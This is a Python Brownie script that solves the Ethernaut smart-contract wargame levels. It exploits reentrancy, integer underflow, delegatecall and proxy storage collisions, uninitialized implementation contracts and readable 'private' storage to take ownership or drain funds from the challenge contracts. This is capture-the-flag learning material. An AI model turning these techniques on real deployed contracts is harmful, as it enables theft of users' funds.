from codecs import decode
from brownie import Contract, network, config, accounts, convert, interface, Wei
from brownie import CoinFlip, AttackCoinFlip, Fallback, Fallout, Telephone, AttackTelephone, Token, Force, AttackForce, Delegation, Vault, King, AttackKing, AttackReentrance, Reentrance, Elevator, AttackElevator, Privacy, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
from brownie import NaughtCoin, AttackNaughtCoin, Preservation, AttackPreservation, Recovery, SimpleToken, MagicNum, AlienCodex, Denial, AttackDenial, AttackShop, Shop, Dex, DexTwo, PuzzleWallet, PuzzleProxy, Motorbike, Engine, AttackEngine
from scripts.helpful_scripts import *
from codecs import decode
import os
from eth_typing import HexStr
import rlp
import time
from eth_utils import keccak, to_bytes, to_checksum_address
from web3 import Web3
from scripts.helpful_scripts import *

w3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))

def fallback():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        fallBack = Fallback.deploy({"from": accounts[1]})
    else:
        fallback_Addr = config["networks"][network.show_active()]["Fallback_address"]
        fallBack = Contract.from_abi("Fallback", fallback_Addr, Fallback.abi)
    # Ensure contributions[msg.sender] > 0.001
    fallBack.contribute({"value": w3.toWei("0.0001", "ether"), "from": account})
    # Call receive()
    print(f"Owner: {fallBack.owner()}")
    account.transfer(to=fallBack.address, amount="0.01 ether")
    print(f"Owner: {fallBack.owner()}")
    fallBack.withdraw({"from": account}).wait(1)


def fallOut():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        fallOut = Fallout.deploy({"from": accounts[1]})
    else:
        fallOut_Addr = config["networks"][network.show_active()]["FallOut_address"]
        fallOut = Contract.from_abi("Fallout", fallOut_Addr, Fallout.abi)

    print(f"Owner: {fallOut.owner()}")
    # Call Fal1out() to set owner = msg.sender
    fallOut.Fal1out({"from": account, "value": 0})
    print(f"{fallOut.owner()}")


def telephone():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        telephone = Telephone.deploy({"from": accounts[1]})
    else:
        telephone_Addr = config["networks"][network.show_active()]["Telephone_address"]
        telephone = Contract.from_abi("Telephone", telephone_Addr, Telephone.abi)
    print(f"Owner: {telephone.owner()}")
    # AttackTelephone constructor will call changeOwner() in Telephone.
    # This will satisfy tx.origin != msg.sender
    attackTelephone = AttackTelephone.deploy(telephone.address, {"from": account})
    print(f"Owner: {telephone.owner()}")


def coinFlip():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        coinFlip = CoinFlip.deploy({"from": account})
    else:
        coinFlip_Addr = config["networks"][network.show_active()]["CoinFlip_address"]
        coinFlip = Contract.from_abi("CoinFlip", coinFlip_Addr, CoinFlip.abi)

    attackCoinFlip = AttackCoinFlip.deploy(coinFlip.address, {"from": account})
    for i in range(0, 10):
        attackCoinFlip.guess({"from": account, "gas_limit": 90000, "allow_revert": True})
    print(f"Consecutive wins: {coinFlip.consecutiveWins()}")


def token():
    account = get_account()
    token_Addr = config["networks"][network.show_active()]["Token_address"]
    token = Contract.from_abi("Token", token_Addr, Token.abi)
    # We start with 20 tokens and transfer() requires value to be greater than 0,
    # but doesn't check for underflow so 20 - 21 = 2^256 -1
    token.transfer("0x0000000000000000000000000000000000000000", 21, {"from": account})
    print(f"Our new token balance: {token.balanceOf(account.address)}")


def delegation():
    account = get_account()
    delegation_Addr = config["networks"][network.show_active()]["Delegation_address"]
    delegation = Contract.from_abi("Delegation", delegation_Addr, Delegation.abi)
    print(f"Owner: {delegation.owner()}")
    # msg.sender, msg.data, msg.value are all preserved when performing a DelegateCall, you just needed
    # to pass in a malicious msg.data (the encoded payload of "pwn()"") to gain ownership of
    # the Delegation contract.
    data_to_send = Web3.keccak(text="pwn()")[0:4].hex()
    account.transfer(delegation.address, amount="0 ether", data=data_to_send).wait(1)
    print(f"Owner: {delegation.owner()}")


def force():
    account = get_account()
    force_Addr = config["networks"][network.show_active()]["Force_address"]
    force = Contract.from_abi("Force", force_Addr, Force.abi)
    attackForce = AttackForce.deploy({"from": account})
    attackForce.attack(force.address, {"from": account, "value": 1}).wait(1)
    print("Force attacked! Try submitting the solution as complete.")


def vault():
    account = get_account()
    vault = deploy_contract(Vault, "Vault", 1, [bytes("testpassword", encoding="utf8")])

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
    else:
        w3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
    # Retrieve and decode 2nd variable (password) stored in slot 1.
    password = w3.eth.get_storage_at(vault.address, 1)
    password_decode = password.decode("utf-8")
    print(f"Password found: {password_decode}")
    # Unlock vault using the password retrieved from storage
    vault.unlock(password, {"from": account}).wait(1)
    print(f"Locked? {vault.locked()}")


def king():
    account = get_account()
    king = deploy_contract(King, "King", 1, [])
    
    # Retrieve and decode 2nd variable (prize) stored in slot 1
    value = w3.eth.get_storage_at(king.address, 1)
    
    # Convert retrieved value to uint256 so it can be passed to
    # forward() we created in AttackKing
    value = convert.to_uint(value)
    print(f"Value: {value}")
    print(f"King: {king._king()}")
    
    attackKing = AttackKing.deploy({"from": account})
    
    # This will satisfy  the msg.value >= prize requirement and change the
    # king's address to AttackKing.
    attackKing.forward(king.address, {"from": account, "value": value + 1})
    print(f"King: {king._king()}")


def reentrance():
    account = get_account()
    reentrance = deploy_contract(Reentrance, "Reentrance", 1, [])
    
    attackreentrance = AttackReentrance.deploy(reentrance.address, {"from": account, "value": Wei("0.001 ether")})
    print(f"Victim balance: {w3.fromWei(w3.eth.get_balance(reentrance.address), 'ether')}")
    print(f"Attacker balance: {w3.fromWei(w3.eth.get_balance(attackreentrance.address), 'ether')}")
    
    # We first need to donate to be added to the "balances" mapping
    attackreentrance.donateToVictim({"from": account}).wait(1)
    print(f"{attackreentrance.balance()}")
    
    # Calling attack() on AttackReentrance will call withdraw() on the reentrance contract.
    # receive() in AttackReentrance will then call withdraw() again before Reentrance updates our
    # balance, allowing us to drain the funds.
    attackreentrance.attack({"from": account}).wait(1)
    print(f"{attackreentrance.balance()}")


def elevator():
    account = get_account()
    elevator = deploy_contract(Elevator, "Elevator", 1, [])
    attackElevator = AttackElevator.deploy(elevator.address, {"from": account.address}, publish_source=False)
    print(f"Top: {elevator.top()}, Floor: {elevator.floor()}")

    # attack() uses a conditional if statement to return false
    # the first time and true the second time.
    attackElevator.attack({"from": account.address}).wait(1)
    print(f"Top: {elevator.top()}, Floor: {elevator.floor()}")


def privacy():
    account = get_account()
    privacy = deploy_contract(Privacy, "Privacy", 1, [])
    attackprivacy = AttackPrivacy.deploy(privacy.address, {"from": account})
    print(f"Locked? {privacy.locked()} ")

    # Retrieve data[2] which is stored in slot 5.
    data2 = w3.eth.get_storage_at(privacy.address, 5)

    # attack() will convert data[2] into bytes16 and pass it to unlock()
    # in the Privacy contract.
    attackprivacy.attack(data2, {"from": account}).wait(1)
    print(f"Locked = {privacy.locked()} ")


def gatekeeperone():
    account = get_account()
    gatekeeperone = deploy_contract(GatekeeperOne, "GatekeeperOne", 1, [])
    attackGatekeeperOne = AttackGatekeeperOne.deploy(gatekeeperone.address, {"from": account.address})
    print(f"Entrant: {gatekeeperone.entrant()}")
    
    attackGatekeeperOne.enter().wait(1)
    print(f"Entrant: {gatekeeperone.entrant()}")


def gatekeepertwo():
    account = get_account()
    gatekeepertwo = deploy_contract(GatekeeperTwo, "GatekeeperTwo", 1, [])
    attackgatekeepertwo = AttackGatekeeperTwo.deploy(gatekeepertwo.address, {"from": account})
    print(f"Entrant: {gatekeepertwo.entrant()}")


def naughtcoin():
    account = get_account()
    naughtCoinAddr = config["networks"][network.show_active()]["NaughtCoin_address"]
    naughtCoin = Contract.from_abi("NaughtCoin", naughtCoinAddr, NaughtCoin.abi)
    attackNaughtCoin = AttackNaughtCoin.deploy(naughtCoin.address, {"from": account})
    
    naughtCoin.approve(attackNaughtCoin.address, naughtCoin.balanceOf(account.address), {"from": account},).wait(1)
    print(f"AttackNaughtCoin allowance: {naughtCoin.allowance(account.address, attackNaughtCoin.address)}")
    print(f"Balance: {naughtCoin.balanceOf(account.address)}")
    
    attackNaughtCoin.attack({"from": account})
    print(f"Balance: {naughtCoin.balanceOf(account.address)}")


def preservation():
    account = get_account()
    preservationAddr = config["networks"][network.show_active()]["Preservation_address"]
    preservation = Contract.from_abi("Preservation", preservationAddr, Preservation.abi)
    attackPreservation = AttackPreservation.deploy({"from": account})
    
    # The call to setTime of LibraryContract is supposed to change storedTime (slot 3) in Preservation,
    # but instead it would write to timeZone1Library (slot 0). This is because storeTime of LibraryContract
    # is at slot 0 and the corresponding slot 0 storage at Preservation is timeZone1Library.
    preservation.setFirstTime(attackPreservation.address, {"from": account})
    
    # the second setFirstTime call will call AttackerPreservation's setTime() which will set the owner as msg.sender
    preservation.setFirstTime(attackPreservation.address, {"from": account})
    print(f"Preservation Owner: {preservation.owner()}")


def recovery():
    account = get_account()
    recovery = deploy_contract(Recovery, "Recovery", 1, [])
    
    # SimpleToken deployed from Recovery Contract. So we use the Recovery instance
    # address to calculate the first deployed contract by setting the nonce to 1.
    simpleToken_contract_address = mk_contract_address(recovery.address, 1)
    simpleTokenInstance = Contract.from_abi("SimpleToken", simpleToken_contract_address, SimpleToken.abi)

    # Now that we have contract object, call destroy() to selfdestruct and clean up after ourselves.
    print(f" Balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")
    simpleTokenInstance.destroy(account.address, {"from": account.address}).wait(1)
    print(f" Balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")


def mk_contract_address(sender: str, nonce: int) -> str:
    """Create a contract address using eth-utils.
    # https://ethereum.stackexchange.com/a/761/620
    """
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    rlp_encoded = keccak(raw)
    address_bytes = rlp_encoded[12:]
    return to_checksum_address(address_bytes)


def deploy_magicnum():
    account = get_account()
    magicNumber = deploy_contract(MagicNum, "MagicNum", 1, [])
    # Bytecode constructed using op-codes to satisfy bytes <= 10
    # Initialization opcodes: 600a600c600039600a6000f3
    # Rubntime opcodes: 602A60805260206080f3
    bytecode = "0x600a600c600039600a6000f3602A60805260206080f3"
    
    # deploy bytecode
    bytecodeTxReceipt = account.transfer(data=bytecode)
    bytecodeInstance = bytecodeTxReceipt.contract_address
    print(bytecodeInstance)

    magicNumber.setSolver(bytecodeInstance, {"from": account})


def alien_codex():
    account = get_account()
    alienCodex = deploy_contract(AlienCodex, "AlienCodex", 1, [])

    # Call make_contact() to pass "contacted" modifier on other methods.
    alienCodex.make_contact({"from": account})

    # AlienCodex's retract() doesnt check for underflow and is not initialized(=0),
    # so calling it once causes underflow and codex's length becomes 2^256.
    # This means any storage slot of the contract can now be written by changing the
    # value at index of codex.
    alienCodex.retract({"from": account})

    # Because codex is a dynamic array, it starts a new slot (slot 1) which only
    # holds the length of the array. The storage location of the corresponding value
    # can be found by keccak256(slot).
    index_one_value_location = convert.to_uint(keccak(convert.to_bytes(1)))
    print(f"First Position: {index_one_value_location}")

    # 2 ** 256 is the max storage size for every Ethereum smart contract. Now that we have the location
    # of index_one_value_location, we can subtract it from the max storage size to find the location of
    # index_zero_value_location, which holds the _owner variable that was inherited from Ownable.sol
    index_zero_value_location = 2 ** 256 - index_one_value_location

    # Call revise() and pass index_zero_value_location and our address to become the new owner.
    alienCodex.revise(index_zero_value_location, account.address, {"from": account})
    print(f"Owner: {alienCodex.owner()}")


def denial():
    account = get_account()
    denial = deploy_contract(Denial, "Denial", 1, [])
    attackDenial = AttackDenial.deploy({"from": account})
    
    # setWithdrawPartner() to our malicious contract.
    denial.setWithdrawPartner(attackDenial.address, {"from": account})


def shop():
    account = get_account()
    shop = deploy_contract(Shop, "Shop", 1, [])
    attackShop = AttackShop.deploy({"from": account})
    
    # attack() will return 101 on the first call to price() and 1 on the
    # second call.
    attackShop.attack(shop.address, {"from": account})


def dex():
    account = get_account()
    dex = deploy_contract(Dex, "Dex", 1, [])
    token1 = interface.IERC20(dex.token1())
    token2 = interface.IERC20(dex.token2())
    
    # Approve a greater amount to spend so you don't have to do it again.
    token1.approve(dex, 500, {"from": account})
    token2.approve(dex, 500, {"from": account})
    
    # Repeat swapping of all token1 for token2 and vice versa to take advantage
    # of solidity's lack of fraction types.
    dex.swap(token1, token2, 10, {"from": account})
    dex.swap(token2, token1, 20, {"from": account})
    dex.swap(token1, token2, 24, {"from": account})
    dex.swap(token2, token1, 30, {"from": account})
    dex.swap(token1, token2, 41, {"from": account})
    dex.swap(token2, token1, 45, {"from": account}).wait(1)
    print(f"Dex Token1 balance: {token1.balanceOf(dex)}")


def dexTwo():
    account = get_account()
    dexTwo = deploy_contract(DexTwo, "DexTwo", 1, [])
    token1 = interface.IERC20(dexTwo.token1())
    token2 = interface.IERC20(dexTwo.token2())
    maliciousToken = interface.IERC20("0x16B5dfb699159c278A5425d8d065d58526646b44")
    
    # Transfer 100 of the malicious tokens we created to DexTwo so that it has 100
    # of each of the three tokens.
    maliciousToken.transfer(dexTwo, w3.toWei(100, "ether"), {"from": account})
    print(f"DexTwo's MaliciousToken balance: {maliciousToken.balanceOf(dexTwo)}")
    
    # Approve the Dex to spend all three tokens.
    token1.approve(dexTwo, 300, {"from": account})
    token2.approve(dexTwo, 300, {"from": account})
    maliciousToken.approve(dexTwo, w3.toWei(300, "ether"), {"from": account})
    
    # Swap 100 MaliciousToken for 100 token1 at a 1:1 ratio
    dexTwo.swap(maliciousToken, token1, w3.toWei(100, "ether"), {"from": account})
    print(f"DexTwo's token1 balance: {token1.balanceOf(dexTwo)}")
    
    # Now that DexTwo has 200 MaliciousToken, we need to swap 200 MaliciousToken
    # to get all 100 of token2
    dexTwo.swap(maliciousToken, token2, w3.toWei(200, "ether"), {"from": account})
    print(f"DexTwo's token2 balance: {token2.balanceOf(dexTwo)}")


def puzzle_wallet():
    account = get_account()
    proxy_Addr = config["networks"][network.show_active()]["PuzzleProxyInstance_address"]
    proxy = Contract.from_abi("PuzzleProxy", proxy_Addr, PuzzleProxy.abi)
    puzzle_wallet = Contract.from_abi("PuzzleWallet", proxy_Addr, PuzzleWallet.abi)
    
    # Calling proposeNewAdmin() directly on the proxy modifies pendingAdmin in storage slot 0,
    # which corresponds to owner in PuzzleWallet. Therefore any write to pendingAdmin
    # will be reflected by owner in PuzzleWallet.
    proxy.proposeNewAdmin(account, {"from": account})
    
    # Now that we are owner, we can addToWhiteList() and pass the onlyWhitelisted modifier.
    puzzle_wallet.addToWhitelist(account, {"from": account})

    # Now we will create a nested multicall to call deposit multiple times in the same tx.
    amount = puzzle_wallet.balance()
    deposit_data = puzzle_wallet.deposit.encode_input()
    execute_data = puzzle_wallet.execute.encode_input(account, 2 * amount, b"")
    multicall_data = puzzle_wallet.multicall.encode_input([deposit_data])
    puzzle_wallet.multicall([deposit_data, multicall_data, execute_data], {"from": account, "amount": amount})

    # Finally, we call setmaxBalance() which consequently modifies slot 1 on the proxy and
    # sets admin to our address.
    puzzle_wallet.setMaxBalance(account.address, {"from": account})


def motorbike():
    account = get_account()
    proxy_Addr = config["networks"][network.show_active()]["MotorbikeProxyInstance_address"]
    engine_proxy = Contract.from_abi("Motorbike", proxy_Addr, Motorbike.abi)
    engine = Contract.from_abi("Engine", proxy_Addr, Engine.abi)
    attack_engine = AttackEngine.deploy({"from": account}) 
    
    # If we want to call the implementation contract directly, we will need to know its
    # address, which according to the contract is stored at 0x...2bbc in the proxy.
    engine_address = w3.eth.get_storage_at(engine_proxy.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")[12:].hex()

    # Get contract object so we can call its functions directly.
    engine = Contract.from_abi("Engine", engine_address, Engine.abi)

    # This will pass the initializer modifer and set our address as "upgrader" because
    # the code will run in the context of Engine, which has a bool state variable
    # "initialized" that defaults to false (since this implementation is supposed to only
    #  be a logic contract).
    engine.initialize({"from": account})
    print(f"Engine upgrader: {engine.upgrader()}")
    

    # Now that we are the upgrader, we can upgrade the implementation to our malicious contract
    # and call selfdestruct() via the the explode() function we created.
    engine.upgradeToAndCall(attack_engine.address, attack_engine.explode.encode_input(), {"from": account})


def main():
    # fallback()
    # fallOut()
    # coinFlip()
    # telephone()
    # token()
    # delegation()
    # vault()
    # king()
    # reentrance()
    # elevator()
    # privacy()
    # gatekeeperone()
    # gatekeepertwo()
    # naughtcoin()
    # preservation()
    # recovery()
    # magicnum()
    # alien_codex()
    # denial()
    # shop()
    # dex()
    # dexTwo()
    # puzzle_wallet()
    # motorbike()
